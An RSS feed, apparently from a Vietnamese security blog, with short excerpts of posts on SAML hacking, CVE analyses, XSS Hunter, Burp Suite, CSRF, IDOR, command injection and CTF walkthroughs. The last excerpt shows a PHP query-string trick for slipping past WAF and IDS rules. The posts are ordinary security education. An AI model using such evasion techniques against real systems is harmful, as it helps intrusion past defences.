<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CyberSecurity on minhtuanact|Blog - Keep a flame in the rain!</title>
    <link>https://minhtuanact.github.io/tags/cybersecurity/</link>
    <description>Recent content in CyberSecurity on minhtuanact|Blog - Keep a flame in the rain!</description>
    <image>
      <title>minhtuanact|Blog - Keep a flame in the rain!</title>
      <url>https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.145.0</generator>
    <language>en</language>
    <lastBuildDate>Tue, 20 Jun 2023 10:46:00 +0700</lastBuildDate>
    <atom:link href="https://minhtuanact.github.io/tags/cybersecurity/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>SAML Hacking (phần 2) - XML Signatures</title>
      <link>https://minhtuanact.github.io/posts/saml-hacking-phan-2-xml-signatures/</link>
      <pubDate>Tue, 20 Jun 2023 10:46:00 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/saml-hacking-phan-2-xml-signatures/</guid>
      <description>&lt;p&gt;Ở phần trước (nếu bạn nào chưa đọc phần 1 thì có thể tìm và đọc tại đây &lt;a href=&#34;https://viblo.asia/p/saml-hacking-phan-1-gioi-thieu-ve-saml-Ny0VGd384PA&#34;&gt;https://viblo.asia/p/saml-hacking-phan-1-gioi-thieu-ve-saml-Ny0VGd384PA&lt;/a&gt;) mình có nói về cách thức hoạt động của SAML. Phần này mình sẽ tiếp tục chia sẻ những gì mình biết về các lỗ hổng có thể tồn tại trong việc triển khai SAML.&lt;/p&gt;
&lt;h1 id=&#34;xml-signatures&#34;&gt;XML Signatures&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;Response&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;Signature&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;SignedInfo&amp;gt;&lt;/span&gt;...&lt;span class=&#34;nt&#34;&gt;&amp;lt;/SignedInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;SignatureValue&amp;gt;&lt;/span&gt;...&lt;span class=&#34;nt&#34;&gt;&amp;lt;/SignatureValue&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;KeyInfo&amp;gt;&lt;/span&gt;...&lt;span class=&#34;nt&#34;&gt;&amp;lt;/KeyInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Signature&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;Response&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Như nội dung phần trước, &lt;code&gt;&amp;lt;Signature&amp;gt;&lt;/code&gt; là chứng thực ký số của SAML Response, đảm bảo tính toàn vẹn và xác thực của dữ liệu SAML Response gửi về SP.&lt;/p&gt;</description>
    </item>
    <item>
      <title>SAML Hacking (phần 1) - Giới thiệu về SAML</title>
      <link>https://minhtuanact.github.io/posts/saml-hacking-phan-1-gioi-thieu-ve-saml/</link>
      <pubDate>Wed, 17 May 2023 15:58:26 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/saml-hacking-phan-1-gioi-thieu-ve-saml/</guid>
      <description>&lt;p&gt;Đây là bài mở đầu của series SAML Hacking mà mình tìm hiểu được trong thời gian vừa qua, bài đầu tiên sẽ giới thiệu về SAML và cách thức hoạt động của nó.&lt;/p&gt;
&lt;h1 id=&#34;saml-là-gì&#34;&gt;SAML là gì?&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;SAML&lt;/strong&gt; (Security Assertion Markup Language) là một chuẩn giao thức được sử dụng rộng rãi trong việc truyền tải thông tin xác thực và phân quyền giữa các hệ thống khác nhau. Được áp dụng chủ yếu trong các ứng dụng web, SAML cho phép xác thực người dùng và đối tác bằng cách sử dụng chứng chỉ số và các thông tin khác để xác nhận danh tính.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Phân tích CVE-2020-10644 - Inductive Automation Ignition RCE</title>
      <link>https://minhtuanact.github.io/posts/phan-tich-cve-2020-10644-inductive-automation-ignition-rce/</link>
      <pubDate>Fri, 05 May 2023 14:51:32 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/phan-tich-cve-2020-10644-inductive-automation-ignition-rce/</guid>
      <description>&lt;p&gt;Vào một buổi chiều, em teammate @lengocanh có rủ mình phân tích một vài CVE của Inductive Automation Ignition. Ở đây mình chọn một CVE phân tích khá đơn giản là CVE-2020-10644 để khởi đầu chuỗi series phân tích các lỗ hổng của Inductive Automation Ignition. Đây là lỗ hổng được team Flashback tìm ra và đem tham dự Pwn2Own Miami 2020 vào tháng 1/2020. Lỗ hổng này cho phép attacker có thể RCE unauthen đến server đang chạy Inductive Automation Ignition từ phiên bản 8.0.0 đến 8.0.7.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Phân tích CVE-2023-23488 Paid Memberships Pro &lt; 2.9.8 - Unauthenticated Blind SQLi và vấn đề với request trong Wordpress</title>
      <link>https://minhtuanact.github.io/posts/phan-tich-cve-2023-23488-paid-memberships-pro-298-unauthenticated-blind-sqli-va-van-de-voi-request-trong-wordpress/</link>
      <pubDate>Tue, 07 Mar 2023 21:24:08 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/phan-tich-cve-2023-23488-paid-memberships-pro-298-unauthenticated-blind-sqli-va-van-de-voi-request-trong-wordpress/</guid>
      <description>&lt;p&gt;Xin chào mọi người, đã lâu rồi mình mới viết một bài phân tích CVE. Dạo gần đây xoay quanh nhiều chuyện :rice::shirt::ear_of_rice::money_with_wings: nên ít thời gian để viết lách. Bài viết này là một cơ hội tình cờ để mình tìm kiếm lỗ hổng trên WordPress. Tuy nhiên, mình đã bỏ qua rất nhiều trường hợp, và mình muốn chia sẻ với các bạn về một lỗ hổng cụ thể.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup XSS Hunter Express (self-hosted) để khai thác XSS</title>
      <link>https://minhtuanact.github.io/posts/setup-xss-hunter-express-self-hosted-de-khai-thac-xss/</link>
      <pubDate>Thu, 03 Nov 2022 14:55:27 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/setup-xss-hunter-express-self-hosted-de-khai-thac-xss/</guid>
      <description>&lt;p&gt;Chẳng là ai là bug bounty hunter, pentester, researcher security cũng đã từng biết đến công cụ khai thác lỗ hổng XSS &lt;a href=&#34;https://xsshunter.com/&#34;&gt;XSSHunter&lt;/a&gt;. Công cụ này giúp cho các bạn có thể test, khai thác các lỗ hổng XSS (nhưng chủ yếu là blind XSS), hoặc dùng để PoC cho các Triager của các Platform Bug bounty verify cho nó nhanh :joy:&lt;/p&gt;
&lt;p&gt;Tuy nhiên, @IAmMandatory đã thông báo rằng XSS Hunter sắp được shutdown :cry:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Một vài mẹo mà mình sử dụng với Burp Suite (phần 2)</title>
      <link>https://minhtuanact.github.io/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite-phan-2/</link>
      <pubDate>Sun, 20 Jun 2021 22:04:09 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite-phan-2/</guid>
      <description>&lt;p&gt;Bài này là bài nối tiếp về một bài mà mình đã viết tại &lt;a href=&#34;https://viblo.asia/p/mot-vai-meo-ma-minh-su-dung-voi-burp-suite-GrLZDGowKk0&#34;&gt;Một vài mẹo mà mình sử dụng với Burp Suite&lt;/a&gt;. Bài đầu tiên mình đã viết về một vài tips và trick mình hay sử dụng với Burp Suite mặc định rồi, bài này mình sẽ viết về một vài extensions của Burp Suite mà mình hay dùng nhé ;)&lt;/p&gt;
&lt;h2 id=&#34;burp-extensions&#34;&gt;Burp Extensions&lt;/h2&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/3bff8390-4cc6-4510-aec5-b8710c4a88ca.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Đây là một hình chụp nhanh các extension trong Burp Suite của mình, hiện tại thì vài cái thì hay dùng, vài cái thì xài rồi thôi không xài nữa, mình chỉ điểm qua những cái mà mình cảm thấy hay và mọi người có thể dùng nó nhé :D&lt;/p&gt;</description>
    </item>
    <item>
      <title>Một vài mẹo mà mình sử dụng với Burp Suite</title>
      <link>https://minhtuanact.github.io/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite/</link>
      <pubDate>Fri, 21 May 2021 11:11:40 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite/</guid>
      <description>&lt;h1 id=&#34;tự-sự&#34;&gt;Tự sự&lt;/h1&gt;
&lt;p&gt;Chuyện là có mấy thằng em hỏi mình về cách sử dụng Burp Suite như thế nào, rồi có tips and tricks nào hay hay không cho chúng nó học, tiện đây mình cũng chia sẻ kinh nghiệm của một người sử dụng BurpSuite cũng được một khoảng thời gian rồi. Hi vọng những chia sẻ này sẽ giúp ích được cho bạn đọc :v:&lt;/p&gt;
&lt;h1 id=&#34;burp-suite-là-gì&#34;&gt;Burp Suite là gì?&lt;/h1&gt;
&lt;p&gt;Đối với những bạn làm pentester hay một số bạn QA (và cả những người anh đang làm AI ở công ty mình nữa :kissing_heart:) khéo cũng đã quá quen với Burp Suite rồi, mình chỉ chia sẻ lại một chút để cho những bạn chưa biết đến phần mềm cực kỳ nổi tiếng được viết bằng Java này hiểu thêm về nó nhé.&lt;br&gt;
Burp Suite được khai sinh bởi &lt;strong&gt;Dafydd Stuttard&lt;/strong&gt; (PortSwigger founder and CEO), và hiện tại Burp Suite vẫn đang được liên tục phát triển bởi PortSwigger. Trải qua rất nhiều phiên bản, BurpSuite đã đỡ &amp;ldquo;xấu&amp;rdquo; hơn và xịn hơn ngày xưa và có một diện mạo như bây giờ.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Làm thế nào để chuyển đổi tài khoản trên Windows (How do I switch users in Windows)?</title>
      <link>https://minhtuanact.github.io/posts/lam-the-nao-de-chuyen-doi-tai-khoan-tren-windows-how-do-i-switch-users-in-windows/</link>
      <pubDate>Wed, 06 May 2020 13:50:16 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/lam-the-nao-de-chuyen-doi-tai-khoan-tren-windows-how-do-i-switch-users-in-windows/</guid>
      <description>&lt;p&gt;Windows hay các hệ điều hành như Linux, MacOS, &amp;hellip; cho phép tồn tại nhiều tài khoản người dùng trên một máy. Các tài khoản đều có thể cho phép bạn tùy biến cài đặt tùy theo sở thích của mình và tách biệt so với các thành viên khác trong khi sử dụng chung máy tính. Bài viết này mình sẽ nêu một số cách để chuyển đổi tài khoản người dùng trên Windows, nghe có vẻ khá đơn giản đúng không :D&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tấn công CSRF và các vấn đề xung quanh</title>
      <link>https://minhtuanact.github.io/posts/tan-cong-csrf-va-cac-van-de-xung-quanh/</link>
      <pubDate>Thu, 09 Jan 2020 09:16:32 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/tan-cong-csrf-va-cac-van-de-xung-quanh/</guid>
      <description>&lt;h2 id=&#34;giới-thiệu-một-chút-về-web-cookies&#34;&gt;Giới thiệu một chút về Web Cookies&lt;/h2&gt;
&lt;p&gt;Do HTTP là giao thức không trạng thái, các request trước và sau không hề liên quan đến nhau. HTTP không thể phân biệt người dùng này với người dùng khác được. Để giải quyết vấn đề này, &lt;strong&gt;cookie&lt;/strong&gt; được ra đời để phân biệt các người dùng với nhau. Các server sẽ set-cookie cho trình duyệt lưu lại, sau đó mỗi khi gửi request thì trình duyệt sẽ thêm mã cookie này rồi gửi đến server.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tìm kiếm các lỗi IDOR, chưa bao giờ lại dễ đến thế với extension Autorize</title>
      <link>https://minhtuanact.github.io/posts/tim-kiem-cac-loi-idor-chua-bao-gio-lai-de-den-the-voi-extension-autorize/</link>
      <pubDate>Mon, 16 Dec 2019 11:14:13 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/tim-kiem-cac-loi-idor-chua-bao-gio-lai-de-den-the-voi-extension-autorize/</guid>
      <description>&lt;p&gt;Chắc hẳn việc tìm lỗi IDOR luôn là công việc thường xuyên của những pentester hay các hunters. Nhưng mà lỗi IDOR ở đây là gì nhỉ :-?&lt;/p&gt;
&lt;h2 id=&#34;what-is-an-idor-vulnerability&#34;&gt;What is an IDOR vulnerability?&lt;/h2&gt;
&lt;p&gt;Vào một ngày đẹp trời, bạn tự nhiên thấy dữ liệu cá nhân của mình bị thay đổi. Bạn nghi ngờ quản trị viên nào đã chọc ngoáy vào dữ liệu cá nhân của mình. Hay là 1 hacker nào đấy đang thử chức năng =)). Rất có thể website đó đã dính lỗi IDOR. Vậy lỗi IDOR là gì và nó hoạt động như thế nào.&lt;/p&gt;</description>
    </item>
    <item>
      <title>HA: Dhanush (ZIP Privilege Escalation), 1 bài labs thử nghiệm nâng cao đặc quyền khá hay của Hacking Articles</title>
      <link>https://minhtuanact.github.io/posts/ha-dhanush-zip-privilege-escalation-1-bai-labs-thu-nghiem-nang-cao-dac-quyen-kha-hay-cua-hacking-articles/</link>
      <pubDate>Sat, 07 Dec 2019 16:35:41 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/ha-dhanush-zip-privilege-escalation-1-bai-labs-thu-nghiem-nang-cao-dac-quyen-kha-hay-cua-hacking-articles/</guid>
      <description>&lt;h2 id=&#34;giới-thiệu&#34;&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Hôm nay trời khá là lạnh, hình như là lạnh nhất từ lúc mùa đông ghé qua thủ đô Hà Nội. Sáng quấn chăn đến 7h sáng mới dậy. Dậy chơi vài tựa game 8-bit ngày xưa khá là kỷ niệm. Lâu rồi cũng không build bài lab nào lên làm thử. Thử tải 1 bài về chơi xem sao. Lần này vẫn là bài trên &lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;https://www.vulnhub.com/&lt;/a&gt;. Chọn ngẫu nhiên 1 bài thử xem trình độ mình đến đâu :joy::joy::joy:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Lỗ hổng PHP-FPM (CVE-2019-11043) với máy chủ NGINX khiến nhiều trang web bị ảnh hưởng</title>
      <link>https://minhtuanact.github.io/posts/lo-hong-php-fpm-cve-2019-11043-voi-may-chu-nginx-khien-nhieu-trang-web-bi-anh-huong/</link>
      <pubDate>Fri, 01 Nov 2019 09:15:42 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/lo-hong-php-fpm-cve-2019-11043-voi-may-chu-nginx-khien-nhieu-trang-web-bi-anh-huong/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/1e9642a2-ef48-4006-a96f-ae4084f33fcf.png&#34;&gt;
Một lỗ hổng được báo cáo gần đây, có mã là CVE-2019-11043, có thể ảnh hưởng đến các trang web sử dụng PHP-FPM để thực thi các trang PHP. Việc sử dụng PHP-FPM đặc biệt phổ biến tại các trang web sử dụng NGINX vì NGINX không có thời gian chạy PHP trong tiến trình. Thay vào đó, NGINX hoạt động như một Reverse Proxy cho các máy chủ ứng dụng và trình quản lý tiến trình như PHP-FPM.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Sử dụng Burp Intruder sao cho hiệu quả [Phần 2]</title>
      <link>https://minhtuanact.github.io/posts/su-dung-burp-intruder-sao-cho-hieu-qua-phan-2/</link>
      <pubDate>Mon, 16 Sep 2019 08:17:11 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/su-dung-burp-intruder-sao-cho-hieu-qua-phan-2/</guid>
      <description>&lt;h2 id=&#34;burp-intruder&#34;&gt;Burp Intruder&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Tiếp tục cho phần 1 được viết tại đây, mình sẽ giới thiệu tiếp cho các bạn cách sử dụng tab &lt;strong&gt;Options&lt;/strong&gt; và cách tấn công sao cho hiệu quả nhất khi sử dụng Burp Intruder&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cấu-hình-cuộc-tấn-công&#34;&gt;Cấu hình cuộc tấn công&lt;/h2&gt;
&lt;h3 id=&#34;options&#34;&gt;Options&lt;/h3&gt;
&lt;h4 id=&#34;attack-options&#34;&gt;Attack Options&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Tại đây, sau khi bạn đã gắn Positions, truyền Payloads thì bạn cũng có thể tấn công được rồi. Nhưng tấn công sao cho hiệu quả thì tab Options này khá quan trọng, nó có rất nhiều tùy chọn dùng để tấn công như request headers, the request engine, attack results, grep match, grep extract, grep payloads, và redirections.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;attack-request-headers&#34;&gt;Attack Request Headers&lt;/h4&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/ce179d97-e970-4211-822c-3b85ec236d14.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Sử dụng Burp Suite Intruder sao cho hiệu quả [Phần 1]</title>
      <link>https://minhtuanact.github.io/posts/su-dung-burp-suite-intruder-sao-cho-hieu-qua-phan-1/</link>
      <pubDate>Fri, 06 Sep 2019 21:47:10 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/su-dung-burp-suite-intruder-sao-cho-hieu-qua-phan-1/</guid>
      <description>&lt;h2 id=&#34;burp-intruder&#34;&gt;Burp Intruder&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Burp Intruder là một công cụ tuyệt vời để &lt;code&gt;automating customized attacks&lt;/code&gt; lên các ứng dụng web. Công cụ này theo mình thấy nó cực kỳ mạnh mẽ và có thể &lt;code&gt;custom&lt;/code&gt; được. Nó sử dụng để thực hiện hàng loại các hành động hay trinh sát. Từ việc đoán các &lt;code&gt;path&lt;/code&gt; đơn giản cho đến khai thác các lỗ hổng như &lt;code&gt;XSS&lt;/code&gt;, &lt;code&gt;SQL Injection&lt;/code&gt;, &amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cách-thức-hoạt-động&#34;&gt;Cách thức hoạt động&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Burp Suite Intruder hoạt động bằng cách sửa đổi request HTTP ban đầu theo ý mình và tự động gửi các payloads tới target. Các payloads có thể tự custom theo ý muốn và chúng ta có thể filter những response từ Website.&lt;/li&gt;
&lt;li&gt;Đối với mỗi cuộc tấn công, bạn phải thêm vào đó 1 hoặc nhiều bộ &lt;code&gt;Payloads&lt;/code&gt; vào các vị trí đánh dấu trong &lt;code&gt;Positions&lt;/code&gt;. Có nhiều các cách để tạo nhiều bộ &lt;code&gt;Payloads&lt;/code&gt;. Burp Intruder cũng có nhiều tùy chọn để giúp phân tích kết quả và xác định các mục tiêu để điều tra thêm.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cấu-hình-một-cuộc-tấn-công&#34;&gt;Cấu hình một cuộc tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;UI Intruder chính cho phép bạn cấu hình đồng thời nhiều cuộc tấn công, mỗi 1 cuộc tấn công là 1 tab riêng. Khi bạn gửi yêu cầu đến Intruder thì nó sẽ tự động mở tab và đánh số riêng. Mỗi tab cấu hình thì chứa một số tab phụ khác, phục vụ cho việc &lt;code&gt;config&lt;/code&gt; cuộc tấn công đó.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/375bb752-b9d2-4329-811e-a9e998229ab5.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>OS Command Injection là gì, Command Injection có nguy hiểm không?, cần cực kỳ thận trọng đối với các lệnh OS gọi từ Website của bạn</title>
      <link>https://minhtuanact.github.io/posts/os-command-injection-la-gi-command-injection-co-nguy-hiem-khong-can-cuc-ky-than-trong-doi-voi-cac-lenh-os-goi-tu-website-cua-ban/</link>
      <pubDate>Tue, 06 Aug 2019 10:52:12 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/os-command-injection-la-gi-command-injection-co-nguy-hiem-khong-can-cuc-ky-than-trong-doi-voi-cac-lenh-os-goi-tu-website-cua-ban/</guid>
      <description>&lt;h2 id=&#34;os-command-injection-là-gì&#34;&gt;OS Command Injection là gì?&lt;/h2&gt;
&lt;p&gt;OS Command Injection (hay còn được gọi là shell injection) là một lỗ hổng bảo mật web cho phép kẻ tấn công thực thi các lệnh hệ điều hành (OS) tùy ý trên máy chủ đang chạy service nào đó. Kẻ tấn công có thể tận dụng lỗ hổng này để khai thác, lấy thông tin, chuyển cuộc tấn công sang hệ thống khác bên trong tổ chức
&lt;img loading=&#34;lazy&#34; src=&#34;https://portswigger.net/web-security/images/os-command-injection.svg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux</title>
      <link>https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/</link>
      <pubDate>Fri, 26 Jul 2019 09:08:58 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con &lt;strong&gt;CVE-2019-13272&lt;/strong&gt; này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con &lt;strong&gt;CVE-2019-13272&lt;/strong&gt; thì bạn có thể tìm hiểu trên mạng nhé ^^.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cve-2019-13272&#34;&gt;CVE-2019-13272&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Trạng thái: Mới&lt;/li&gt;
&lt;li&gt;Tên: CVE-2019-13272&lt;/li&gt;
&lt;li&gt;Thành phần: Dễ bị tổn thương&lt;/li&gt;
&lt;li&gt;Phần cứng: Tất cả&lt;/li&gt;
&lt;li&gt;Hệ điều hành: Linux&lt;/li&gt;
&lt;li&gt;Ưu tiên: Cao&lt;/li&gt;
&lt;li&gt;Mức độ nghiêm trọng: Cao&lt;/li&gt;
&lt;li&gt;Tác giả: Laura Pardo&lt;/li&gt;
&lt;li&gt;Báo cáo: 2019-07-17 20:06 UTC&lt;/li&gt;
&lt;li&gt;Đã được sửa trong phiên bản: Kernel 5.1.17&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Trích nguyên văn của Laura Pardo&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution</title>
      <link>https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/</link>
      <pubDate>Thu, 11 Jul 2019 10:25:07 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài &lt;strong&gt;Difficulty: Beginner&lt;/strong&gt; nên build lên làm luôn xem nó có &lt;strong&gt;Beginner&lt;/strong&gt; không :v:&lt;/li&gt;
&lt;li&gt;Đây là một bài lab khá mới của tác giả &lt;strong&gt;Zayotic&lt;/strong&gt; trong series &lt;strong&gt;symfonos&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Link bài lab nếu ai muốn khám phá: &lt;a href=&#34;https://www.vulnhub.com/entry/symfonos-1,322/&#34;&gt;symfonos: 1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tấn-công&#34;&gt;Tấn công&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó. Ở đây mình sử dụng &lt;code&gt;arp-scan&lt;/code&gt; để quét cho nhanh.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF</title>
      <link>https://minhtuanact.github.io/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf/</link>
      <pubDate>Tue, 09 Jul 2019 14:46:26 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf/</guid>
      <description>&lt;h2 id=&#34;mở-đầu&#34;&gt;Mở đầu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong &lt;code&gt;$_GET&lt;/code&gt; hoặc &lt;code&gt;$_POST&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Ví dụ: &lt;code&gt;/?foo=bar&lt;/code&gt; sẽ trở thành &lt;code&gt;Array([foo] =&amp;gt; &amp;quot;bar&amp;quot;)&lt;/code&gt;. Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: &lt;code&gt;/?%20news[id%00=42&lt;/code&gt; sẽ được chuyển thành &lt;code&gt;Array([news_id] =&amp;gt; 42)&lt;/code&gt;. Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số &lt;code&gt;news_id&lt;/code&gt; thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
